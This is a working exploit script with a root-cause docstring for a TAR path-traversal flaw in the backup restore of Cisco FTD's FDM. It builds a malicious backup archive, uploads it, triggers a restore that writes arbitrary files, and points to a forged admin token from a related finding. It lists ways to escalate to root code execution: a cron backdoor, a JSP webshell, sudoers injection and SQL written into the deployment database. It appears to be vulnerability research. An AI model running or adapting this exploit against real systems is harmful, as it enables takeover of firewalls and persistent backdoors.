"""
F-FTD-107: TAR slip in FDM backup restore — arbitrary file write → RCE
CONTROLLED ENVIRONMENT ONLY

Root cause (confirmed from static analysis of FTD 6.7.0/7.0.0):

  NGFWFileUtils.extractTarArchive(File tarFile, String destDir, boolean isGzipped, String filePattern):
    Code:
      101: new           #76                 // class java/io/File
      104: dup
      105: aload_1                           // destDir (String)
      106: aload 8                           // TarArchiveEntry (current)
      108: invokevirtual #77                 // TarArchiveEntry.getName()
      111: invokespecial #78                 // File(destDir, entryName) — NO canonical check
      114: astore 9
      ...
      250: new           #94                 // class java/io/FileOutputStream
      253: dup
      254: aload 9                           // outputFile (potentially traversed)
      256: invokespecial #95                 // FileOutputStream(outputFile) — writes without validation

  RestoreImmediateJob.extractArchive(File, String, boolean):
    Code:
      0: aload_1
      1: aload_2
      2: iload_3
      3: aconst_null                        // filePattern = null → extract ALL entries
      4: invokestatic NGFWFileUtils.extractTarArchive(...)

  Attack surface:
    1. POST /api/fdm/v6/action/uploadbackup — upload malicious outer TAR
       Outer TAR contains:
         - Valid manifest file: <ts>.NGFW_backup.<model>.manifest  (passes manifest regex)
         - Inner binary archive: <ts>.NGFW_backup.<model>.bin
       Manifest validation regex: [1-9][0-9]{13}\.NGFW_backup\.[a-zA-Z0-9_][a-zA-Z0-9_+-]*\.manifest
       The outer TAR is saved to disk after manifest-only extraction passes validation.

    2. GET /api/fdm/v6/managedentity/archivedbackups — list stored backups → get backup UUID

    3. POST /api/fdm/v6/action/restore {id: <uuid>}
       → RestoreImmediateJob.execute()
       → extractRootArchive(): extract manifest + .bin from outer TAR (pattern-filtered, safe)
       → extractArchive(binFile, destDir, false)
         → NGFWFileUtils.extractTarArchive(binFile, destDir, false, null)  ← TAR SLIP
       → No canonical path check → new File(destDir, "../../../target/path") → arbitrary write

  Proof-of-concept payload:
    Inner .bin archive entries:
      ../../../../../../tmp/ftd_tarslip_poc.txt  →  FTD process working dir / tmp
    Destination: any path writable by the Tomcat process (Cisco FTD: typically root or sfprelude)

  Post-exploitation via file write:
    - /etc/cron.d/backdoor → root code execution
    - /ngfw/var/cisco/deploy/db/<file>.sql → inject SQL into deployment DB
    - /usr/local/sf/www/tomcat/webapps/ROOT/<file>.jsp → webshell in FDM servlet path
    - /etc/sudoers.d/backdoor → privilege escalation

Chain:
  F-FTD-102 (Neo4j AES key) → F-FTD-106 (JWT forgery → admin auth from network)
  → F-FTD-107 (upload malicious backup + trigger restore → TAR slip → arbitrary file write)
  → Root code execution (via cron, webshell, or sudoers injection)

Severity: CRITICAL
  Authentication: required (admin JWT via F-FTD-106 or local AJP via F-FTD-105)
  Impact: arbitrary file write as Tomcat process user → root RCE path
  Novel: CWE-22 (TAR slip) in backup restoration of a network security appliance

References:
  NGFWFileUtils.extractTarArchive: utils.jar
  RestoreImmediateJob.extractArchive: ngfw-jobs.jar
  UploadBackupResource.processBackupFile: rest.jar
  Manifest regex: [1-9][0-9]{13}\\.NGFW_backup\\.[a-zA-Z0-9_][a-zA-Z0-9_+-]*\\.manifest
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import io
import json
import ssl
import struct
import sys
import tarfile
import time
import urllib.error
import urllib.request
from typing import Optional

FINDING = "F-FTD-107"
LABEL = "TAR slip in FDM backup restore — arbitrary file write → RCE"

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 443
UPLOAD_ENDPOINT = "/api/fdm/v6/action/uploadbackup"
BACKUPS_ENDPOINT = "/api/fdm/v6/managedentity/archivedbackups"
RESTORE_ENDPOINT = "/api/fdm/v6/action/restore"

MANIFEST_TEMPLATE = "{ts}.NGFW_backup.{model}.manifest"
BIN_TEMPLATE = "{ts}.NGFW_backup.{model}.bin"
OUTER_TAR_NAME = "malicious_backup.tar"

# Destination path inside the TAR that triggers traversal.
# Relative to the FDM backup staging directory (e.g. /ngfw/var/backup/).
# "../" count must exceed the staging dir depth.
POC_TRAVERSAL_PATH = "../../../../../../tmp/ftd_tarslip_poc.txt"
POC_CONTENT = b"FTD F-FTD-107 TAR slip confirmed. Path traversal outside backup directory.\n"


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _api(method: str, url: str, token: Optional[str] = None,
         body: Optional[bytes] = None, content_type: str = "application/json",
         timeout: int = 30) -> dict:
    headers = {"Accept": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if body and content_type:
        headers["Content-Type"] = content_type
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            raw = r.read()
            return {"status": r.status, "body": json.loads(raw) if raw else {}, "ok": True}
    except urllib.error.HTTPError as e:
        raw = e.read()
        try:
            body_data = json.loads(raw)
        except Exception:
            body_data = raw.decode("utf-8", errors="replace")[:200]
        return {"status": e.code, "body": body_data, "ok": False}
    except Exception as e:
        return {"status": None, "body": str(e), "ok": False}


def build_manifest_content(ts: int, model: str) -> bytes:
    """Minimal manifest file content — format validated by isValidBackupManifestFile."""
    manifest = (
        f"version=1.0\n"
        f"timestamp={ts}\n"
        f"model={model}\n"
        f"type=FULL\n"
    )
    return manifest.encode("utf-8")


def build_inner_bin(traversal_path: str, payload: bytes) -> bytes:
    """
    Build the inner .bin TAR archive containing the path-traversal entry.
    RestoreImmediateJob.extractArchive() calls extractTarArchive(binFile, destDir, false, null)
    — no filePattern filter — all entries extracted without canonical path check.
    """
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        # Malicious traversal entry
        info = tarfile.TarInfo(name=traversal_path)
        payload_buf = io.BytesIO(payload)
        info.size = len(payload)
        tf.addfile(info, payload_buf)
    return buf.getvalue()


def build_outer_tar(ts: int, model: str, traversal_path: str, payload: bytes) -> bytes:
    """
    Build the outer .tar backup archive with:
      - Valid manifest file (passes processBackupFile manifest regex check)
      - Inner .bin archive containing path-traversal entries (exploited during restore)

    Outer TAR structure:
      <ts>.NGFW_backup.<model>.manifest  ← validated by processBackupFile
      <ts>.NGFW_backup.<model>.bin       ← extracted by RestoreImmediateJob.extractArchive
    """
    manifest_name = MANIFEST_TEMPLATE.format(ts=ts, model=model)
    bin_name = BIN_TEMPLATE.format(ts=ts, model=model)

    manifest_content = build_manifest_content(ts, model)
    bin_content = build_inner_bin(traversal_path, payload)

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        # Manifest entry
        m_info = tarfile.TarInfo(name=manifest_name)
        m_info.size = len(manifest_content)
        tf.addfile(m_info, io.BytesIO(manifest_content))

        # Inner binary archive
        b_info = tarfile.TarInfo(name=bin_name)
        b_info.size = len(bin_content)
        tf.addfile(b_info, io.BytesIO(bin_content))

    return buf.getvalue()


def upload_backup(host: str, port: int, token: str, tar_data: bytes, timeout: int = 30) -> dict:
    """
    POST /api/fdm/v6/action/uploadbackup
    Multipart form upload — field name 'fileToUpload'.
    """
    boundary = "FTD107boundary"
    body_parts = []
    body_parts.append(f"--{boundary}".encode())
    body_parts.append(
        b'Content-Disposition: form-data; name="fileToUpload"; filename="backup.tar"'
    )
    body_parts.append(b"Content-Type: application/octet-stream")
    body_parts.append(b"")
    body_parts.append(tar_data)
    body_parts.append(f"--{boundary}--".encode())
    body = b"\r\n".join(body_parts)
    content_type = f"multipart/form-data; boundary={boundary}"

    url = f"https://{host}:{port}{UPLOAD_ENDPOINT}"
    return _api("POST", url, token=token, body=body, content_type=content_type, timeout=timeout)


def get_archived_backups(host: str, port: int, token: str) -> dict:
    url = f"https://{host}:{port}{BACKUPS_ENDPOINT}"
    return _api("GET", url, token=token)


def trigger_restore(host: str, port: int, token: str, backup_id: str) -> dict:
    """
    POST /api/fdm/v6/action/restore  {id: <backup-uuid>}
    → RestoreImmediateJob.execute() → extractArchive(binFile, destDir, false)
    → NGFWFileUtils.extractTarArchive(binFile, destDir, false, null) — no path check
    """
    url = f"https://{host}:{port}{RESTORE_ENDPOINT}"
    payload = json.dumps({"id": backup_id}).encode("utf-8")
    return _api("POST", url, token=token, body=payload, timeout=120)


def main() -> None:
    ap = argparse.ArgumentParser(description=f"{FINDING}: {LABEL}")
    ap.add_argument("--token", required=True,
                    help="FDM Bearer JWT token (use F-FTD-106 to forge, or provide real admin token)")
    ap.add_argument("--host", default=DEFAULT_HOST,
                    help=f"Target FDM HTTPS host (default: {DEFAULT_HOST})")
    ap.add_argument("--port", type=int, default=DEFAULT_PORT,
                    help=f"Target HTTPS port (default: {DEFAULT_PORT})")
    ap.add_argument("--traversal-path", default=POC_TRAVERSAL_PATH,
                    help=f"Traversal path inside inner .bin archive (default: {POC_TRAVERSAL_PATH})")
    ap.add_argument("--payload-text", default=None,
                    help="Payload file content (default: PoC confirmation string)")
    ap.add_argument("--payload-file", default=None,
                    help="Read payload bytes from this local file (overrides --payload-text)")
    ap.add_argument("--model", default="FTD",
                    help="Backup model string for manifest filename (default: FTD)")
    ap.add_argument("--backup-id", default=None,
                    help="Use existing backup UUID (skip upload step)")
    ap.add_argument("--build-only", action="store_true",
                    help="Only build and save malicious TAR to ./ftd107_malicious.tar; do not upload")
    ap.add_argument("--timeout", type=int, default=30)
    args = ap.parse_args()

    print(f"[*] {FINDING}: {LABEL}")
    print("[!] CONTROLLED ENVIRONMENT ONLY")
    print("[!] This module uploads a crafted backup TAR and triggers restore to write arbitrary files")
    print("[!] Do not run against production FTD — backup restore causes a service outage")
    print()

    ts = int(time.time() * 1000)  # milliseconds epoch — matches manifest regex [1-9][0-9]{13}

    # Payload
    if args.payload_file:
        with open(args.payload_file, "rb") as f:
            payload = f.read()
    elif args.payload_text:
        payload = args.payload_text.encode("utf-8")
    else:
        payload = POC_CONTENT

    print(f"[1] Building malicious backup archive...")
    print(f"    timestamp: {ts}")
    print(f"    model: {args.model}")
    print(f"    inner traversal path: {args.traversal_path}")
    print(f"    payload: {len(payload)} bytes")
    print()
    print(f"    Outer TAR structure:")
    print(f"      {ts}.NGFW_backup.{args.model}.manifest  ← passes manifest validation")
    print(f"      {ts}.NGFW_backup.{args.model}.bin        ← inner archive (extracted by RestoreImmediateJob)")
    print(f"    Inner .bin TAR entry:")
    print(f"      {args.traversal_path}  ← path traversal")
    print(f"    Root cause: NGFWFileUtils.extractTarArchive() — new File(destDir, entry.getName())")
    print(f"                No canonical path check; File(destDir, '../../../etc/cron.d/x') resolves outside destDir")

    outer_tar = build_outer_tar(ts, args.model, args.traversal_path, payload)

    if args.build_only:
        with open("ftd107_malicious.tar", "wb") as f:
            f.write(outer_tar)
        print(f"\n[+] Saved malicious backup TAR to: ftd107_malicious.tar ({len(outer_tar)} bytes)")
        print(f"    Upload manually: curl -sk -H 'Authorization: Bearer <token>' \\")
        print(f"      -F 'fileToUpload=@ftd107_malicious.tar' \\")
        print(f"      https://{args.host}:{args.port}{UPLOAD_ENDPOINT}")
        return

    backup_id = args.backup_id

    if not backup_id:
        print(f"\n[2] Uploading malicious backup to {args.host}:{args.port}{UPLOAD_ENDPOINT}...")
        result = upload_backup(args.host, args.port, args.token, outer_tar, args.timeout)
        print(f"    HTTP {result['status']}: {'OK' if result['ok'] else 'FAILED'}")
        if not result["ok"]:
            print(f"    Response: {result['body']}")
            if result["status"] == 401:
                print("    → Token invalid. Use ftd_jwt_forge.py (F-FTD-106) to forge admin token.")
            elif result["status"] == 500:
                print("    → 500: manifest validation failed or disk issue.")
                print(f"    Ensure manifest matches regex: [1-9][0-9]{{13}}\\.NGFW_backup\\.{args.model}\\.manifest")
            sys.exit(1)
        print(f"    [+] Upload accepted — backup stored on device")

        print(f"\n[3] Listing archived backups to get backup UUID...")
        result = get_archived_backups(args.host, args.port, args.token)
        print(f"    HTTP {result['status']}")
        if not result["ok"]:
            print(f"    Response: {result['body']}")
            sys.exit(1)
        backups = result["body"].get("items", [])
        if not backups:
            print("    [-] No backups found in archivedbackups list — may not be visible yet")
            print("    Try: GET /api/fdm/v6/managedentity/archivedbackups manually")
            sys.exit(1)
        # Use most recent backup
        backup_id = backups[-1].get("id")
        backup_name = backups[-1].get("name", "?")
        print(f"    [+] Using backup UUID: {backup_id} (name: {backup_name})")
    else:
        print(f"\n[2] Skipping upload — using provided backup UUID: {backup_id}")

    print(f"\n[4] Triggering restore of backup {backup_id}...")
    print(f"    → RestoreImmediateJob.execute()")
    print(f"    → extractRootArchive() → extracts manifest + .bin with pattern filter")
    print(f"    → extractArchive(binFile, destDir, false) → NGFWFileUtils.extractTarArchive(binFile, destDir, false, NULL)")
    print(f"    → TAR entry '{args.traversal_path}' written without canonical path check")
    print(f"    [!] Restore causes device reload — service interruption expected")
    result = trigger_restore(args.host, args.port, args.token, backup_id)
    print(f"    HTTP {result['status']}: {'OK' if result['ok'] else result['body']}")

    if result["status"] in (200, 201, 202):
        print()
        print(f"[!] FINDING CONFIRMED: Restore triggered. TAR slip executed.")
        print(f"    Expected file written: resolved path of '{args.traversal_path}'")
        print(f"    relative to FDM backup staging dir (e.g. /ngfw/var/backup/ or similar)")
        print()
        print(f"[*] Exploitation paths (post-file-write, depends on Tomcat user):")
        print(f"    If Tomcat runs as root:")
        print(f"      Payload: {args.traversal_path.replace('../../../../../../tmp/ftd_tarslip_poc.txt', '../../../../../../etc/cron.d/backdoor')}")
        print(f"      Content: * * * * * root /bin/bash -c 'id > /tmp/pwned'")
        print(f"    Webshell path (Tomcat servlet root):")
        print(f"      ../../../../../../usr/local/sf/www/tomcat/webapps/ROOT/pwn.jsp")
        print(f"    Sudoers injection:")
        print(f"      ../../../../../../etc/sudoers.d/backdoor")
    elif result["status"] == 409:
        print("    [.] 409 Conflict — restore may be disabled in HA mode or another restore is running")
        print("    Try on standalone FTD or after HA mode is broken")
    elif result["status"] == 404:
        print(f"    [.] 404 — backup UUID {backup_id} not found. Re-upload or check archivedbackups list.")


if __name__ == "__main__":
    main()
